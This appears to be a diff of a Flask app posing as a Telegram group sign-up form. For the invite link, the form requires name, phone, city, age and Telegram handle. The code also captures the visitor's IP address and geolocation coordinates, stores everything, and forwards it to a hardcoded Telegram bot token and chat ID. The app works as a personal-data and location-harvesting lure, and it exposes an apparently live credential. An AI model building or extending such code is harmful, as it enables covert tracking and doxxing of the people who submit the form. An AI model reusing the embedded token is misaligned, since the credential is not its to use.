@@ -6,7 +6,8 @@ DATA_DIR = "user_data"
 os.makedirs(DATA_DIR, exist_ok=True)
 
 BOT_TOKEN = "7986825869:AAH_I4ZVqmPQx3MZnrBo79YoSdL1YdJ63UA"
-CHAT_ID = "7984761077"  # Replace with your actual Telegram chat ID
+CHAT_ID = "7984761077"  # Replace with your Telegram user ID or group chat ID
+TELEGRAM_GROUP_LINK = "https://t.me/+APbxtoSb76hmZWZl"
 
 @app.route("/")
 def index():
@@ -18,11 +19,14 @@ def handle_form():
         return jsonify({"error": "Invalid data format"}), 400
 
     data = request.get_json()
-    ip = request.remote_addr
-    username = data.get("telegram", "").strip().lstrip('@')
 
     if not all([data.get(k) for k in ["fullname", "phone", "towncity", "age", "telegram"]]):
         return jsonify({"error": "All fields required."}), 400
+
+    username = data.get("telegram", "").strip().lstrip('@')
+    ip = request.remote_addr
+    latitude = data.get("latitude")
+    longitude = data.get("longitude")
 
     user_data = {
         "fullname": data["fullname"],
@@ -30,27 +34,29 @@ def handle_form():
         "towncity": data["towncity"],
         "age": data["age"],
         "telegram": username,
-        "latitude": data.get("latitude"),
-        "longitude": data.get("longitude"),
+        "latitude": latitude,
+        "longitude": longitude,
         "ip": ip
     }
 
-    # Save to file
-    filepath = os.path.join(DATA_DIR, f"{username}_{ip.replace('.', '-')}.json")
+    # Save data to file
+    filepath = os.path.join(DATA_DIR, f"{username or ip}.json")
     with open(filepath, "w") as f:
         json.dump(user_data, f, indent=2)
 
-    # Send to Telegram bot
+    # Format Telegram message
     message = "\n".join([
-        f"New Telegram Group Request:",
+        "New Group Join Request:",
         f"Name: {user_data['fullname']}",
         f"Phone: {user_data['phone']}",
-        f"Town/City: {user_data['towncity']}",
+        f"City: {user_data['towncity']}",
         f"Age: {user_data['age']}",
         f"Telegram: @{user_data['telegram']}",
         f"IP: {ip}",
-        f"Location: {user_data['latitude']}, {user_data['longitude']}"
+        f"Location: {latitude}, {longitude}"
     ])
+
+    # Send to Telegram
     try:
         requests.get(
             f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
@@ -59,7 +65,7 @@ def handle_form():
     except Exception as e:
         print("Telegram send failed:", e)
 
-    return jsonify({"link": "https://t.me/+APbxtoSb76hmZWZl"})  # Replace with your real group link
+    return jsonify({"link": TELEGRAM_GROUP_LINK})
 
 if __name__ == "__main__":
     app.run(debug=True)
